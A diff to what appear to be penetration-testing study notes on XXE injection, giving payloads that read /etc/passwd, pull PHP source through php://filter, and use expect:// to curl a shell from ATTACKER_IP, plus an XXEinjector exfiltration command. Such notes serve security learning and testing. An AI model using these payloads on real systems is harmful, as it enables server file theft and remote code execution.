@@ -3,7 +3,7 @@
 * [[#Local File Disclosure]]
 	* [[#Read file contains some of XML's special characters]]
 		* [[#Read PHP files using PHP wrapper]]
-		* [[#Advanced Exfiltration with CDATA]] **(for any web application backend)**
+		* [[#Advanced Exfiltration with CDATA]] **(for any web application backend using XML Parameters entities)**
 * [[#Remote Code Execution]]
 	* PHP
 * [[#Blind XXE]]
@@ -14,19 +14,23 @@
 ---
 ## Overview
 [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
-- Cause: Occurs when [[XML]] data is taken from a user-controlled input without properly sanitizing or safely parsing it.
-- Exploitation: An attacker supplies malicious [[XML]] data containing external entity references.
-- Impact:
+- **Cause**: 
+	- Occurs when [[XML]] data is taken from a user-controlled input without properly sanitizing or safely parsing it.
+- **Exploitation**: 
+	- An attacker supplies malicious [[XML]] data containing external entity references.
+- **Impact**:
     - File Disclosure
     - SSRF (Server-Side Request Forgery)
     - Denial of Service (DoS)
     - Remote Code Execution (RCE)
-- Prevention:
+- **Prevention**:
     - Disable External Entity Processing: Configure XML parsers to ignore external entities.
     - Use Safer Parsers: Some parsers don’t support external entities by default.
     - Input Validation: Avoid parsing XML from untrusted sources if possible.
 
-**Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).**
+Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).
+> [!CAUTION]
+> XML is a case sensitive language `<!ENTITY email SYSTEM` != `<!ENTITY email system`.
 
 ---
 ## Local File Disclosure
@@ -35,7 +39,9 @@
 POST /submitDetails.php HTTP/1.1
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [<!ENTITY email SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE email [
+<!ENTITY email SYSTEM "file:///etc/passwd">
+]>
 <root>
 	<name>a</name>
 	<tel>1</tel>
@@ -61,8 +67,10 @@ Encode PHP source files, such that they would not break the XML format when refe
 POST /submitDetails.php HTTP/1.1
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [<!ENTITY company SYSTEM 
-"php://filter/convert.base64-encode/resource=index.php">]>
+<!DOCTYPE email [
+<!ENTITY email SYSTEM 
+"php://filter/convert.base64-encode/resource=index.php">
+]>
 <root>
 	<name>a</name>
 	<tel>1</tel>
@@ -128,7 +136,8 @@ POST /submitDetails.php HTTP/1.1
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
-<!ENTITY email SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">]>
+<!ENTITY email SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">
+]>
 <root>
 	<name>a</name>
 	<tel>1</tel>
@@ -256,3 +265,4 @@ XXEINJECT
 ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 ```
 * All exfiltrated files get stored in the Logs folder under the tool `cat Logs/10.129.201.94/etc/passwd.log`
+---
